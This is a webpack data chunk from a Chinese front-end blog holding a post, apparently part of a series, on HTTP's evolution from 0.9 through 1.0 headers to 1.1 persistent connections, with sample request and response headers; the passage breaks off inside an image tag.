webpackJsonp([66692416344048],{1056:function(n,a){n.exports={data:{file:{childImageSharp:{sizes:{base64:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAeCAYAAAAsEj5rAAAACXBIWXMAAAsSAAALEgHS3X78AAAHlUlEQVRIx11WaWxU1xWewbQlrdofkSIhGiBpMPZ4Vs/2lpm3zupZPOOZ8Sz2YGzANkaAKaYQUrMkLYgiIlxCQjCYQAwYEoMQNJAIFBxaQgUhoCopYceBJo1pKFVDCbOc0/fesOZKV+fM1Tvf/c56R0VYOZW8lvAxtSybvbExAu1+mndGuaDQ2F4rNHVFhCZJZlMeZ1Qrf9Mt+H+qur/ihFORAFA64J0pVTcXVcDmcKFfruIzZ7rY1H89fAZivjbM1MzFxkAnZqWd9M7KJcTmv7zCN44sY+tflm12C79WLxLCqidWN9cwWpYvsfXL13vasZudgm4mgX4hW6h1teRjnrZCwjOzWO/twIR/FjZ7WnEZ35JvcUSeU4gwSXV7W1sJzEH6R8nSRArlXjr6r7S1DqNUvMAzCXCzSfDxDRAUmyDkaoawtEPi1LxHyGLMkby5gEqUy7atjnq1roosAXqE6Yq7DBXa7RLS6HRG8y4hhbwzDiJbj4IkXUwS5e1h07IOorMePUL6ruiKGmRblg2PesJlq9nxrJMMfydIbhIWP9jMPrBLkrIHgXfG0CdmgKMjwFARFKVvHEQo5xUyKDDRN2T7aE17mV5rfZQYm1lM0EQYWUe0aNTxoKl0Qnk5jVqNA/VaFu3SBS7SB7Ju0ougr2KKWg2DBi17mbCaxyghMzgeMTTp2W7CGkTKHshZqn0Q5Osg6opBhAmAzcADY/NheyQJBi2D8mXVehYMOgEsJg9aTIxSN2YTO+ohQ62G6rGZa5AmAjmj0YvzG5vhVP8f4fTO12FtVxfMjTfC6zPbwOsIQNybhK6GlmLCm5DA6cu2aoeSaaOeVheLxRKgpoJcZ5UAly94MeeiQ+jnQtBCcTBTZ8Ght9fDfy58DDdOHIRj2zdA/4uzYWBpZ6Fr6jR8/lfWP8n2usqA2mQgH7msr3Ks0WgEfGvN6lz/q6tgXqgZjgpZOGSLwsldA4CFG4j3rmP/osU47xkdrm5pLfjdETm+p64cf0fJME34HiVFV+VYajF50UGGc/Nnz4XDfW/ArQ09+M++XsCblwD+fQEL356HswuWwdedS+Dg2p5ilZQwa7VrpCHZ9nOl7Ojg44B0hxxg0hbMjx2rh2iwDk4feReKI58hfn8V8c5lwNyXiF+dRbz4Z1jY1g4TJ1rQbnHfc/ORihJDr5q0kw8AyVqDjpeSEpJLAyaMN6HRwMDuTa/B1fcPwcfbBuHc8SPw+cnDsGvzeim7HOg0DpAYoouPBWUMJxUo65y18X4MtbYJOo3zjgQoxwWen1iNDdPmwPu9+2BvfCXsXbQRehf9Hly0B8aN04OuioGqCipvt/hQ5GLzS4Dh0Tdv3+/nvm0qVVUlfUouboOWK8jxmaznMBXIwpbfroWN63th384tcHTfDpj0gg21lQxoK+m8TQGMb5UxAt6OUYSVkUuGK5MPKiuIHicZwWqDmNNqpE6pIFBjpGDxsqXwuxUroWtBN5w4NgSbNvcDIRW61CUFu9UrtV/si7Fjf/ajUmICSvxKgJMtdQxVK2XOU9RpGNBL3VBeQWIqPR3SjR3QOW8xrFmxCnrWbYJMaobEkr1HE/4zIpv4nrK7NIrbpF+tspoYZdpMLte+wNPRu6S1Bs1GqV/1DOqMPFjIMFbq3dg6cyFkGmagqZqHaoOAHF2XZ6ngWg+XBM4RVoLHOWrLVG4uWpo4FvsvfHz6NktFkbT6QafnQGsUoFLHYm1dFj44cgwYPgQVkymkbP6RWl+LNIRjL/uFhltuNjEoYySCXaNUojOsMPSw4aqwa+o9ga5DggiC1RFDmyMG1bYQVlTSIIhRMJq9RaPZJ4VF+DQZ6MCAmOkLurJ/DYiNt/R67VMKs4hrqjL+o+6mjrj0hjBEOG+1h8FOxcFO1oHVFgazPYQGqdfNthBYpUqwEME78nsT4tP7o96WwWSwA1nKb35iyCZ8M85EXE3oYBO3ab4RKWcSKCaFJJMCQprSpPQcUFwKzWQUKo1+lC9x0r7Fcc+0OVOj8zEkNrY8BAuLDV11ruZvDXrhuJ3NIu+bAYK/FXjfdOA8zegUp6DdmQKNMQD+8HTseW1LYeijE/jB4Q+/Wry8a5L01B6MeaetUcDSjfVjjOVM7da+bTMPvHfkbmrKb5DksjkLncmZqXTe6siAnWmAmkhbYUPvQP7cufO5L69fxyvD/8Ctb+/aI2PU8AmvRGqZAoiIityzb8/T165d3X3t2vD/Pjr+KW7b+R6u2/AOrli9CQfePYQXLg3jpSvDeOLkWTxw6Oh3uwYPrJTMlNHlFcLPeNk6/UOXZ7cuGP1A397fP/7v584vvzJ8o+dvn33+Zm/v9q9X/2EDbN+19+ybm3ds33/ww5f63uovf/D9woVL1A90P5dQqYaGhpQfg4N71BJbteoHqyk7Z+e8zlfuSupPHj+/eO2bso5ZcxQ9Fsiqgny6ZOv3+VTfjIwo+iefnFYN7BxQf3FxuEwGH1c+fgxBuIZnTFuIIh9U2qt3844fb9y0Vf0gXPKm7bzKzYZ+wGTKFFWNz1/6v8OLUiuaFKMJz00yEvaa/RQZnK086s6MutpEqRLx+kcT+rH1f+YikeeNfqnwAAAAAElFTkSuQmCC",aspectRatio:.6666666666666666,src:"/static/avatar-a4ccbab8e7381acb89452773ce94d5a0-25c91.png",srcSet:"/static/avatar-a4ccbab8e7381acb89452773ce94d5a0-8a97b.png 200w,\n/static/avatar-a4ccbab8e7381acb89452773ce94d5a0-0fdf3.png 400w,\n/static/avatar-a4ccbab8e7381acb89452773ce94d5a0-25c91.png 600w",srcWebp:"/static/avatar-a4ccbab8e7381acb89452773ce94d5a0-216f6.webp",srcSetWebp:"/static/avatar-a4ccbab8e7381acb89452773ce94d5a0-5d70e.webp 200w,\n/static/avatar-a4ccbab8e7381acb89452773ce94d5a0-d1677.webp 400w,\n/static/avatar-a4ccbab8e7381acb89452773ce94d5a0-216f6.webp 600w",sizes:"(max-width: 600px) 100vw, 600px"}}},site:{siteMetadata:{title:"女王控的博客",description:'前端工程师，黑猫女王控，欢迎勾搭，技术相关<a href="https://github.com/towavephone" target="_blank">@towavephone</a>，QQ闲聊<a href="tencent://AddContact/?fromId=45&fromSubId=1&subcmd=all&uin=634407147&website=www.oicqzone.com">@towave</a>，bili关注<a href="https://space.bilibili.com/11507708#/" target="_blank">@towave</a>',siteUrl:"https://blog.towavephone.com"}},mainPost:{html:'<h1 id="http1：http-性能优化"><a href="#http1%EF%BC%9Ahttp-%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>HTTP1：HTTP 性能优化</h1>\n<p>谈及浏览器中的网络，就避不开 HTTP。我们知道 HTTP 是浏览器中最重要且使用最多的协议，是浏览器和服务器之间的通信语言，也是互联网的基石。而随着浏览器的发展，HTTP 为了能适应新的形式也在持续进化，我认为学习 HTTP 的最佳途径就是了解其发展史，所以在接下来的三篇文章中，我会从浏览器发展的视角来和你聊聊 HTTP 演进。这三篇分别是即将完成使命的 HTTP/1、正在向我们走来的 HTTP/2，以及未来的 HTTP/3。</p>\n<p>本文主要介绍的是 HTTP/1.1，我们先讲解 HTTP/1.1 的进化史，然后再介绍在进化过程中所遇到的各种瓶颈，以及对应的解决方法。</p>\n<h2 id="超文本传输协议-http09"><a href="#%E8%B6%85%E6%96%87%E6%9C%AC%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE-http09" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>超文本传输协议 HTTP/0.9</h2>\n<p>首先我们来看看诞生最早的 HTTP/0.9。HTTP/0.9 是于 1991 年提出的，主要用于学术交流，需求很简单——用来在网络之间传递 HTML 超文本的内容，所以被称为超文本传输协议。整体来看，它的实现也很简单，采用了基于请求响应的模式，从客户端发出请求，服务器返回数据</p>\n<p>下面我们就来看看 HTTP/0.9 的一个完整的请求流程（可参考下图）。</p>\n<ul>\n<li>因为 HTTP 都是基于 TCP 协议的，所以客户端先要根据 IP 地址、端口和服务器建立 TCP 连接，而建立连接的过程就是 TCP 协议三次握手的过程。</li>\n<li>建立好连接之后，会发送一个 GET 请求行的信息，如 GET /index.html 用来获取 index.html。</li>\n<li>服务器接收请求信息之后，读取对应的 HTML 文件，并将数据以 ASCII 字符流返回给客户端。</li>\n<li>HTML 文档传输完成后，断开连接。</li>\n</ul>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-15-02-02-52-ccea046483414068555ac684424e0bdb-9e345.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 38.687150837988824%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAA7DAAAOwwHHb6hkAAABX0lEQVQY02VRy0rDQBTNh/kBfkE/wo1rwYWuxC6kuLJWXKlQcOnCdmELSrsoFhERo7RpHlObZBInicnMnUwmjq0UWg/D5Q5zD/fMOVq5imKO5RU4p5QxBpRSzvnasLbspJSq6rrearULWVLGAZg7m5qmgZA9mYwx9ijwbyYylguRr5AXC/XX552jy60m2W7O3kcXFNfSuJGRehqdQnR81etXzqLqbcCBqV2aYRiKk88hCpnT+Lpnb56Qynkwsuol3ZfssKAHEqol22t0uxu1ZPcmKqVQSrVO5y6KIs/zXNe1HScI/Kkfd4d278037adP5wE5fd8dmJN7a9x51D/aQ2/wgsIAA4DmOA7GOI5jRbYsy8c4IWHqO9mXB1AgFIRhCiAJoXHCgWZA3MRDYRiu/FnJVn4KIZS32e9hyhXOQQgu5Z//6pUq51UGc+c1OcdaBmmaKi2EEISQqoss/o/9AEkUuiWFYusqAAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 15 02 02 52"\n        title=""\n        src="/static/2021-07-15-02-02-52-ccea046483414068555ac684424e0bdb-fee1c.png"\n        srcset="/static/2021-07-15-02-02-52-ccea046483414068555ac684424e0bdb-a67b7.png 200w,\n/static/2021-07-15-02-02-52-ccea046483414068555ac684424e0bdb-0b187.png 400w,\n/static/2021-07-15-02-02-52-ccea046483414068555ac684424e0bdb-fee1c.png 800w,\n/static/2021-07-15-02-02-52-ccea046483414068555ac684424e0bdb-b1a91.png 1200w,\n/static/2021-07-15-02-02-52-ccea046483414068555ac684424e0bdb-9e345.png 1432w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>总的来说，当时的需求很简单，就是用来传输体积很小的 HTML 文件，所以 HTTP/0.9 的实现有以下三个特点。</p>\n<ul>\n<li>第一个是只有一个请求行，并没有 HTTP 请求头和请求体，因为只需要一个请求行就可以完整表达客户端的需求了。</li>\n<li>第二个是服务器也没有返回头信息，这是因为服务器端并不需要告诉客户端太多信息，只需要返回数据就可以了。</li>\n<li>第三个是返回的文件内容是以 ASCII 字符流来传输的，因为都是 HTML 格式的文件，所以使用 ASCII 字节码来传输是最合适的。</li>\n</ul>\n<h2 id="被浏览器推动的-http10"><a href="#%E8%A2%AB%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8E%A8%E5%8A%A8%E7%9A%84-http10" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>被浏览器推动的 HTTP/1.0</h2>\n<p>HTTP/0.9 虽然简单，但是已经可以满足当时的需求了。不过变化是这个世界永恒不变的主旋律，1994 年底出现了拨号上网服务，同年网景又推出一款浏览器，从此万维网就不局限于学术交流了，而是进入了高速的发展阶段。随之而来的是万维网联盟（W3C）和 HTTP 工作组（HTTP-WG）的创建，它们致力于 HTML 的发展和 HTTP 的改进。</p>\n<p>万维网的高速发展带来了很多新的需求，而 HTTP/0.9 已经不能适用新兴网络的发展，所以这时就需要一个新的协议来支撑新兴网络，这就是 HTTP/1.0 诞生的原因。不过在详细分析 HTTP/1.0 之前，我们先来分析下新兴网络都带来了哪些新需求。</p>\n<p>首先在浏览器中展示的不单是 HTML 文件了，还包括了 JavaScript、CSS、图片、音频、视频等不同类型的文件。因此支持多种类型的文件下载是 HTTP/1.0 的一个核心诉求，而且文件格式不仅仅局限于 ASCII 编码，还有很多其他类型编码的文件</p>\n<h2 id="那么该如何实现多种类型文件的下载呢？"><a href="#%E9%82%A3%E4%B9%88%E8%AF%A5%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E5%A4%9A%E7%A7%8D%E7%B1%BB%E5%9E%8B%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%8B%E8%BD%BD%E5%91%A2%EF%BC%9F" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>那么该如何实现多种类型文件的下载呢？</h2>\n<p>文章开头我们说过，HTTP 是浏览器和服务器之间的通信语言，不过 HTTP/0.9 在建立好连接之后，只会发送类似 GET /index.html 的简单请求命令，并没有其他途径告诉服务器更多的信息，如文件编码、文件类型等。同样，服务器是直接返回数据给浏览器的，也没有其他途径告诉浏览器更多的关于服务器返回的文件信息。</p>\n<p>这种简单的交流型形式无疑不能满足传输多种类型文件的需求，那为了让客户端和服务器能更深入地交流，HTTP/1.0 引入了请求头和响应头，它们都是以为 Key-Value 形式保存的，在 HTTP 发送请求时，会带上请求头信息，服务器返回数据时，会先返回响应头信息。至于 HTTP/1.0 具体的请求流程，你可以参考下图。</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-15-02-04-03-60633fafd1680271cdda997682c67746-7985c.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 41.02920723226704%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAA7DAAAOwwHHb6hkAAABSUlEQVQY03VQTUvDQBDNL+s/EsGbJ0HRmyAovWmRCp6kF1Evoq25CAW/0kYpNWJ287XJJk1INtnsblyTWovgY5admX1vhzcKFxXlVbkUTFSimudCZv9DkUcI3hSi5nqu+zoe1TWjlNs2BgBBiFwvolQSuOQzxubiRibRtMba08be8e511rn7RG7P0A8to2uDU8s4epj0ty7ijhqmWfYtJoRomrY8meVJ9/ajdVCsnJlxsB1Z60W8mWU7sb1283LS2iervZTXdpQgCNrttuM4bg0IIQ58051d3kN1BKCpWmDgQBWYg/fJ1fPb8HyI+o/AR4hSquR5ruu67/sYY8/zptMpQj5GTuqaCUbRjADoxwmNIhLgLEtzEjohMKT41/MCjXlaloSWBZW3jIJztngtKCvKpYWJHyy+4JynaSrXEYYhQihJkqb5Z9IXwEW8N4e4NDcAAAAASUVORK5CYII=\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 15 02 04 03"\n        title=""\n        src="/static/2021-07-15-02-04-03-60633fafd1680271cdda997682c67746-fee1c.png"\n        srcset="/static/2021-07-15-02-04-03-60633fafd1680271cdda997682c67746-a67b7.png 200w,\n/static/2021-07-15-02-04-03-60633fafd1680271cdda997682c67746-0b187.png 400w,\n/static/2021-07-15-02-04-03-60633fafd1680271cdda997682c67746-fee1c.png 800w,\n/static/2021-07-15-02-04-03-60633fafd1680271cdda997682c67746-b1a91.png 1200w,\n/static/2021-07-15-02-04-03-60633fafd1680271cdda997682c67746-7985c.png 1438w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>有了请求头和响应头，浏览器和服务器就能进行更加深入的交流了。</p>\n<p>那 HTTP/1.0 是怎么通过请求头和响应头来支持多种不同类型的数据呢？</p>\n<p>要支持多种类型的文件，我们就需要解决以下几个问题</p>\n<ul>\n<li>首先，浏览器需要知道服务器返回的数据是什么类型的，然后浏览器才能根据不同的数据类型做针对性的处理。</li>\n<li>其次，由于万维网所支持的应用变得越来越广，所以单个文件的数据量也变得越来越大。为了减轻传输性能，服务器会对数据进行压缩后再传输，所以浏览器需要知道服务器压缩的方法。</li>\n<li>再次，由于万维网是支持全球范围的，所以需要提供国际化的支持，服务器需要对不同的地区提供不同的语言版本，这就需要浏览器告诉服务器它想要什么语言版本的页面。</li>\n<li>最后，由于增加了各种不同类型的文件，而每种文件的编码形式又可能不一样，为了能够准确地读取文件，浏览器需要知道文件的编码类型</li>\n</ul>\n<p>基于以上问题，HTTP/1.0 的方案是通过请求头和响应头来进行协商，在发起请求时候会通过 HTTP 请求头告诉服务器它期待服务器返回什么类型的文件、采取什么形式的压缩、提供什么语言的文件以及文件的具体编码。最终发送出来的请求头内容如下：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="76566820228752360000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`accept: text/html\naccept-encoding: gzip, deflate, br\naccept-Charset: ISO-8859-1,utf-8\naccept-language: zh-CN,zh`, `76566820228752360000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                \n              >\n                复制代码\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="text"><pre style="counter-reset: linenumber NaN" class="language-text line-numbers"><code class="language-text">accept: text/html\naccept-encoding: gzip, deflate, br\naccept-Charset: ISO-8859-1,utf-8\naccept-language: zh-CN,zh</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>其中第一行表示期望服务器返回 html 类型的文件，第二行表示期望服务器可以采用 gzip、deflate 或者 br 其中的一种压缩方式，第三行表示期望返回的文件编码是 UTF-8 或者 ISO-8859-1，第四行是表示期望页面的优先语言是中文。</p>\n<p>服务器接收到浏览器发送过来的请求头信息之后，会根据请求头的信息来准备响应数据。不过有时候会有一些意外情况发生，比如浏览器请求的压缩类型是 gzip，但是服务器不支持 gzip，只支持 br 压缩，那么它会通过响应头中的 content-encoding 字段告诉浏览器最终的压缩类型，也就是说最终浏览器需要根据响应头的信息来处理数据。下面是一段响应头的数据信息：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="55269550951749526000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`content-encoding: br\ncontent-type: text/html; charset=UTF-8`, `55269550951749526000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                \n              >\n                复制代码\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="text"><pre style="counter-reset: linenumber NaN" class="language-text line-numbers"><code class="language-text">content-encoding: br\ncontent-type: text/html; charset=UTF-8</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>\n<p>其中第一行表示服务器采用了 br 的压缩方法，第二行表示服务器返回的是 html 文件，并且该文件的编码类型是 UTF-8。</p>\n<p>有了响应头的信息，浏览器就会使用 br 方法来解压文件，再按照 UTF-8 的编码格式来处理原始文件，最后按照 HTML 的方式来解析该文件。这就是 HTTP/1.0 支持多文件的一个基本的处理流程。</p>\n<p>HTTP/1.0 除了对多文件提供良好的支持外，还依据当时实际的需求引入了很多其他的特性，这些特性都是通过请求头和响应头来实现的。下面我们来看看新增的几个典型的特性</p>\n<ul>\n<li>有的请求服务器可能无法处理，或者处理出错，这时候就需要告诉浏览器服务器最终处理该请求的情况，这就引入了状态码。状态码是通过响应行的方式来通知浏览器的。</li>\n<li>为了减轻服务器的压力，在 HTTP/1.0 中提供了 Cache 机制，用来缓存已经下载过的数据。</li>\n<li>服务器需要统计客户端的基础信息，比如 Windows 和 macOS 的用户数量分别是多少，所以 HTTP/1.0 的请求头中还加入了用户代理的字段</li>\n</ul>\n<h2 id="缝缝补补的-http11"><a href="#%E7%BC%9D%E7%BC%9D%E8%A1%A5%E8%A1%A5%E7%9A%84-http11" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>缝缝补补的 HTTP/1.1</h2>\n<p>不过随着技术的继续发展，需求也在不断迭代更新，很快 HTTP/1.0 也不能满足需求了，所以 HTTP/1.1 又在 HTTP/1.0 的基础之上做了大量的更新。接下来我们来看看 HTTP/1.0 遇到了哪些主要的问题，以及 HTTP/1.1 又是如何改进的。</p>\n<h3 id="改进持久连接"><a href="#%E6%94%B9%E8%BF%9B%E6%8C%81%E4%B9%85%E8%BF%9E%E6%8E%A5" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>改进持久连接</h3>\n<p>HTTP/1.0 每进行一次 HTTP 通信，都需要经历建立 TCP 连接、传输 HTTP 数据和断开 TCP 连接三个阶段（如下图）。</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-15-02-06-41-fefdb432fa8777084fcbb8e76e0e8bcb-09eb7.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 95.27145359019265%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAATCAIAAAAf7rriAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACS0lEQVQ4y5VTW08TQRTeP2aiGBsLBpraQm00JsZEG0N4QFSo9gGRF30yvmnsZbfdXtgUCaSk9GbFCwTksoaIIVpLb7alqUvbne7uzLht18ZADWVyMsnMd77Mme98h8BHFkKN/TALF0zSggkGhqW5G2h3rgnBI7nEMW6DXCvn46R52THx3mmJvh5LbASb0Elk2Hw4xeFLbqhjkHEWqlyQZFEb6op80YM1DL7sx+dc2MHizmT5qh3tsotcbdIZnXbHnnrjFnsouvWjSW5A6J8gjgnW+Bj6nRQ9WsGjrXv1IqVG21Rnwd4moHVTorZEFyuVeEVuVMnzS+N88AEIP+QXR8W9YKusNIcmwsJ4WBgJCC5WJOTDGSvop0G/G+wWUYssllNp+1DKNpimru6/GuA+000y3CnAATcYmgFaD3gcFwhzRLhAAgMD9D7wtahokuGg0V26yZRM/gOds+hj+db9TgGpKNDnAmftvCUmEPPfpGcfxOefxBerYqGmkGW1e71YM4P1fnzehUlW+WSljpaT8F0SRhJQLpPoaLAsJ12nM7d8mTtM1kilme3D/7ZK+httSaXyfp4y5EjDL+e1nHWgskG3IDmlnSwfiI7ehtViJTpVjUxVo08qS4/q32NdeVvpc/knoHprpLpGa3hbj7RpO8VgFDjeTK9N+tammfV71EqITbcd1pW31d6GtwdncQ+NyS/4dIPR58U6P77yBqtopVUnk1tl8+Xcim1EjlXH6MeXt1Pr813Ns9LoSg6H7uLQGI7cx4vDeC/QUbA/nTj7F4u/EHIAAAAASUVORK5CYII=\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 15 02 06 41"\n        title=""\n        src="/static/2021-07-15-02-06-41-fefdb432fa8777084fcbb8e76e0e8bcb-fee1c.png"\n        srcset="/static/2021-07-15-02-06-41-fefdb432fa8777084fcbb8e76e0e8bcb-a67b7.png 200w,\n/static/2021-07-15-02-06-41-fefdb432fa8777084fcbb8e76e0e8bcb-0b187.png 400w,\n/static/2021-07-15-02-06-41-fefdb432fa8777084fcbb8e76e0e8bcb-fee1c.png 800w,\n/static/2021-07-15-02-06-41-fefdb432fa8777084fcbb8e76e0e8bcb-09eb7.png 1142w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>在当时，由于通信的文件比较小，而且每个页面的引用也不多，所以这种传输形式没什么大问题。但是随着浏览器普及，单个页面中的图片文件越来越多，有时候一个页面可能包含了几百个外部引用的资源文件，如果在下载每个文件的时候，都需要经历建立 TCP 连接、传输数据和断开连接这样的步骤，无疑会增加大量无谓的开销。</p>\n<p>为了解决这个问题，HTTP/1.1 中增加了持久连接的方法，它的特点是在一个 TCP 连接上可以传输多个 HTTP 请求，只要浏览器或者服务器没有明确断开连接，那么该 TCP 连接会一直保持。</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-15-02-06-58-b8ce09661e0ab688a83fadd136673754-54f32.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 70.52631578947368%; position: relative; bottom: 0; left: 0; background-image: 